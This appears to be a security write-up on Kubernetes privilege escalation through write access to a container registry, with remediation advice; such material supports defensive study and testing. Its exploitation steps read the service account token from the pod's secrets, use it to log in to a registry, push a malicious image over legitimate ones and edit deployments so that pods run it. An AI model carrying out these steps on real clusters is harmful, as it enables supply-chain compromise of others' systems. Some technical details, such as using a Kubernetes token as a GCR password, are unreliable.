
# Kubernetes Container Registry Privilege Escalation

## 1. Overview

### Attack Vector Description

This vulnerability allows an attacker who has compromised a container within a Kubernetes cluster to escalate privileges by leveraging overly permissive access to the cluster's container registry (e.g., Docker Hub, Google Container Registry (GCR), AWS Elastic Container Registry (ECR)). The attacker attempts to push a malicious image to the registry, potentially overwriting existing legitimate images or injecting backdoors into new images. If successful, any pod that pulls and runs the compromised image will also be compromised, allowing for lateral movement and further privilege escalation within the cluster.

### Potential Impact and Consequences

*   **Complete Cluster Takeover:** By compromising a foundational image, an attacker can potentially compromise all applications running within the cluster.
*   **Data Exfiltration:** The attacker can inject code into running containers to steal sensitive data.
*   **Denial of Service (DoS):** Malicious images can disrupt application functionality or cause the cluster to crash.
*   **Supply Chain Attack:** If the compromised registry is used to distribute images outside of the cluster, the attack can spread to other environments.

### Risk Level Assessment

**Critical**

### Technical Explanation

This vulnerability arises when the service account associated with a pod has overly permissive access to the container registry. This often happens due to misconfiguration where the service account has write access (push/create) to the registry namespace where critical images are stored.  The Kubernetes cluster then uses those credentials to pull images, and the same credentials could be used to push new images or overwrite existing ones.  The principle of least privilege is not followed, leading to this dangerous scenario. The root cause lies in the container registry IAM (Identity and Access Management) policies.

### Prerequisites and Conditions Needed

1.  **Compromised Container:** The attacker must have gained access to a container running within the Kubernetes cluster. This can be achieved through various methods, such as exploiting a vulnerability in the application code, leveraging exposed APIs, or exploiting misconfigurations.
2.  **Service Account Access:** The container's service account must have credentials that allow it to interact with the container registry.  This includes Kubernetes service account token and associated IAM permissions.
3.  **Container Registry Access:** The container's service account must have excessive write permissions to the target registry namespace.
4.  **Image Pull Policy:** Vulnerability is amplified if the deployment uses `imagePullPolicy: Always`, which forces the cluster to pull the image even if it exists locally, thus pulling potentially malicious versions.

## 2. Validation and Exploitation Steps

**Assumptions:**

*   The attacker has a shell inside a container running within the Kubernetes cluster.
*   The container is running with a Kubernetes service account.
*   `kubectl` is installed inside the compromised container, configured with appropriate credentials, and pointed to the Kubernetes cluster.  If not, the Kubernetes service account token can be retrieved and used to authenticate to the Kubernetes API.
*   A tool like `jq` is installed in the container. If not, similar tools can be used or data can be manually parsed.
*   We will use a sample image `evil-image:latest` for demonstration purposes.  This would be replaced with an actual malicious image in a real attack.

**Steps:**

1.  **Retrieve Service Account Token:**

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

*   **Explanation:**  Retrieves the service account token from the well-known location inside the container's filesystem. This token is used to authenticate against the Kubernetes API server.
*   **Why:** This token proves the container's identity to the cluster.
*   **Expected Output:** A long string representing the service account token.
*   **Validation:**  Verify the token is not empty.
*   **Alternative:**  If `kubectl` is not configured, this token can be used directly in `curl` commands to interact with the Kubernetes API.

2.  **Retrieve Service Account Namespace:**

```bash
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

*   **Explanation:**  Retrieves the namespace associated with the service account.
*   **Why:** Used to determine the service account's scope and construct API requests.
*   **Expected Output:** The namespace name (e.g., `default`, `kube-system`).
*   **Validation:**  Verify the namespace name is not empty.

3.  **Discover Container Registry Used by the Cluster:**

This step has several possible approaches.  The choice of approach depends on what information is readily available within the compromised container.

**Approach 1: Inspect Pod Manifests**

```bash
kubectl get pods -n $NAMESPACE -o yaml | grep image:
```

*   **Explanation:**  Lists all pods in the current namespace and filters the output to find image names.
*   **Why:** Examining existing pod manifests can reveal the container registry being used. Look for image names like `gcr.io/project-id/image-name` (GCR), `docker.io/library/image-name` (Docker Hub), or `xxxxxxxxxxxx.dkr.ecr.region.amazonaws.com/image-name` (ECR).
*   **Expected Output:**  Lines containing image names with the container registry prefix.
*   **Validation:** Identify the registry domain and organization/account.

**Approach 2: Inspect Cluster DNS Configuration**

This approach requires more knowledge about the cluster's internal DNS.  It may be useful if `kubectl` is heavily restricted.

```bash
# Example using 'nslookup' or 'dig'
nslookup kubernetes.default.svc.cluster.local
```

*   **Explanation:** This command uses DNS lookup to get information about the Kubernetes service discovery. Look for records that point to specific image repositories, especially in internal domains.
*   **Why:** This might reveal internal registry endpoints or alias configurations.
*   **Expected Output:** IP Addresses, CNAME records. Analyze this output to discover if the cluster relies on a specific private registry domain.

**Approach 3: Check Environment Variables of Running Pods.**

```bash
kubectl exec -it <pod-name> -n <namespace> -- env
```

*   **Explanation:** Lists environment variables of the specified pod in the specified namespace. Replace `<pod-name>` and `<namespace>` with actual values.
*   **Why:** Some deployments might explicitly configure the registry using environment variables.
*   **Expected Output:** A list of environment variables. Look for variables with names that might include "REGISTRY", "IMAGE_REPO" etc.
*   **Validation:** Identify the registry domain and potentially credentials or other authentication information if they are exposed via environment variables.

4.  **Determine Write Permissions to the Registry:**

This is the most crucial validation step.  We'll try to push a test image to the registry.

```bash
# Replace <registry_url/namespace/image:tag> with the actual registry URL and desired image name
REGISTRY_URL="<registry_url/namespace/image:tag>"

# Authenticate to the registry using the service account token as the password
docker login -u oauth2accesstoken -p "$TOKEN" <registry_url>

# Try to tag an existing image as the new malicious image.  We'll use 'busybox' as a placeholder.
docker pull busybox:latest
docker tag busybox:latest "$REGISTRY_URL"

# Attempt to push the tagged image
docker push "$REGISTRY_URL"
```

*   **Explanation:**
    *   `docker login`:  Attempts to authenticate to the container registry using the service account token. The username `oauth2accesstoken` is a convention used by many registries (like Google Container Registry) when authenticating with OAuth tokens. Other registry types might require different usernames (or no username).
    *   `docker pull`:  Pulls an existing image (`busybox`) from Docker Hub. This provides a local image to tag and push.
    *   `docker tag`:  Tags the pulled image with the target registry URL and image name, preparing it for pushing to the registry. This overwrites the registry and tag with our chosen values.
    *   `docker push`:  Attempts to push the tagged image to the specified container registry.
*   **Why:** This directly tests the service account's write permissions to the target registry.
*   **Expected Output:**
    *   Successful login:  "Login Succeeded" message.
    *   Successful push:  "Pushed", "Digest", "Layers" messages indicating the image was uploaded successfully.
    *   Failure:  "denied: requested access to the resource is denied", "unauthorized", or similar error messages indicate lack of permissions.
*   **Validation:**  A successful push indicates that the service account has write access to the registry and the vulnerability is exploitable.
*   **Alternative:**  Instead of `docker login`, you might need to use the `docker` CLI's `--password-stdin` option if required by the registry: `echo "$TOKEN" | docker login -u oauth2accesstoken --password-stdin <registry_url>`

5.  **Exploitation: Push Malicious Image:**

If the previous step was successful, replace `busybox` with a custom-built malicious image.

```bash
# Build a malicious image (replace with your actual image build process)
# For example:
# docker build -t evil-image:latest .

# Authenticate to the registry (if not already authenticated)
docker login -u oauth2accesstoken -p "$TOKEN" <registry_url>

# Tag the malicious image
docker tag evil-image:latest "$REGISTRY_URL"

# Push the malicious image
docker push "$REGISTRY_URL"
```

*   **Explanation:**  Replaces the placeholder `busybox` image with a specially crafted malicious image.
*   **Why:** This is the actual exploitation step, where the attacker uploads their payload to the registry.
*   **Expected Output:** Successful push, indicating the malicious image has been uploaded.
*   **Validation:** Verify that the malicious image is now present in the registry.

6.  **Trigger the Compromised Image (if possible):**

Ideally, after uploading the malicious image, trigger a pod to pull and run it.  This might involve:

*   **Modifying existing deployment configurations:** This is HIGHLY likely to trigger alerts, but is a very fast way to confirm the impact of the exploit.
*   **Creating a new deployment that utilizes the compromised image.** A less noisy approach.

**Example (assuming you can modify a deployment configuration):**

```bash
kubectl edit deployment <deployment-name> -n <namespace>
```

Change the `image:` field in the deployment's specification to point to the compromised image (`$REGISTRY_URL`). Kubernetes will automatically update the pods to use the new image (depending on the imagePullPolicy).

*   **Explanation:**  Modifies the deployment configuration to use the malicious image.
*   **Why:** This forces the cluster to pull and run the attacker's image, completing the exploit chain.
*   **Expected Output:**  Pods will be recreated using the new image.
*   **Validation:**  Verify that the pods are running the malicious image (e.g., by inspecting the running process list within the container or observing any malicious activity).

## Remediation Recommendations

1.  **Principle of Least Privilege:**  Revise IAM policies for the container registry to grant only the necessary permissions to each service account.  Service accounts should only have read access (pull) unless explicitly required for image building processes within the cluster (which is rare).
2.  **Dedicated Service Accounts:** Avoid using the default service account for sensitive operations. Create dedicated service accounts with specific, restricted permissions.
3.  **Image Pull Secrets:** Use image pull secrets in deployments to authenticate to the registry instead of relying on service account permissions. This separates authentication for image pulling from the service account's overall permissions.
4.  **Network Policies:**  Implement network policies to restrict network access of compromised containers. This can limit the impact of privilege escalation.
5.  **Runtime Security:** Use a runtime security solution like Falco or Sysdig Secure to detect and prevent malicious activity within containers.
6.  **Image Scanning:**  Implement regular image scanning using tools like Trivy or Anchore to identify vulnerabilities in container images before they are deployed.
7.  **Admission Controllers:**  Use admission controllers like Open Policy Agent (OPA) to enforce policies related to container image sources and service account permissions. OPA policies can prevent deployments from pulling images from untrusted registries or using service accounts with excessive privileges.
8.  **Regular Audits:**  Conduct regular audits of IAM policies, service account configurations, and network policies to identify and correct any misconfigurations.
9.  **Implement an Image Signing and Verification process:** Use tools like Notary, Cosign, or Sigstore to sign images and require signature verification at deployment time. This will prevent the cluster from pulling images that have not been signed by a trusted party.
